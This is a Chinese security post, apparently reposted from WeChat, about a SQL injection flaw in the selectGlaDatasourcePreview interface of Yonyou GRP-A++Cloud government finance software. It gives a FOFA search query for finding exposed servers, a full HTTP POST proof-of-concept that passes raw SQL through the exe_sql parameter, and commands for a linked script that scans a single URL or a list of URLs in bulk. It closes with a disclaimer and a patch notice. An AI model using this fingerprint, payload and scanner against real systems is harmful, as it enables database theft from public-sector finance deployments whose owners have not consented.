<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ro9VfNrarScv9kEcKTaYhw)

**免责声明：本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，若利用本文提供的内容或工具造成任何直接或间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。**

**fofa**

```
body="/pf/portal/login/css/fonts/style.css"

```

**一、漏洞简述**

用友 GRPA++Cloud 政府财务云报销产品是在新一代财务平台上的业务管理系统， 依托系统门户、 权限管理等公共资源， 报销管理围绕财务审核流程， 完成借款单填写、 报销单填写、 还款单填写、 预算控制、 财务审核、 自动生成记账凭证。通过报销系统可实现借款报销还款和业务审批不受任何时间、 地点的限制， 同时将费用支出与预算管理子系统关联， 实现实时预算控制。其接口 selectGlaDatasourcePreview 存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

****二、漏洞检测 poc****

```
POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 74
exe_sql=SELECT%20999*999&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgyLrm6gaa4IkppeROUX3h2rlbeTCYYoJyZq7UXwYDib02OyOTWXEoia3wOCfqBSMHNwzFXqpEKy5rKQ/640?wx_fmt=png&from=appmsg)

‍  

****三、漏洞检测脚本****

****安全测试人员可通过该脚本进行探测自身服务是否存在此漏洞：****

https://github.com/ATonysan/poc-exp/blob/main/YongYouGRPA++_selectGlaDatasourcePreview_SQLInject.py

批量检测:

python YongYouGRPA++_selectGlaDatasourcePreview_SQLInject.py -f url.txt

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgyLrm6gaa4IkppeROUX3h2rQyNHQpDzPwNQP8eRic8sACPgG7kcAoWiakdeVQMWBLz6YBKqPxFvAG0Q/640?wx_fmt=png&from=appmsg)

单个 url 检测漏洞:

python YongYouGRPA++_selectGlaDatasourcePreview_SQLInject.py -u url

![图片](https://mmbiz.qpic.cn/mmbiz_png/5h6SVtXyicgyLrm6gaa4IkppeROUX3h2rlKGZRkN47DiaPcg0cPQESPE7U4SnIvZXDL4Ls8jFicSaoncdaIYQO5ibQ/640?wx_fmt=png&from=appmsg)

**四、修复**

官方已更新补丁，请升级至最新版本。

官网地址：http://www.jinher.com/Cons/index/id/159/aid/1310